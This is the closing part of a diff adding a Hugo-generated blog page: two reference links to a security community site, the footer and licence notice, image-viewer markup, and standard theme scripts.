+    >https://xz.aliyun.com/news/4716</a></p>
+<p><a class="link" href="https://xz.aliyun.com/news/6968"  target="_blank" rel="noopener"
+    >https://xz.aliyun.com/news/6968</a></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2020 - 
+        
+        2025 Example Person
+    </section>
+    
+    <section class="powerby">
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.29.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
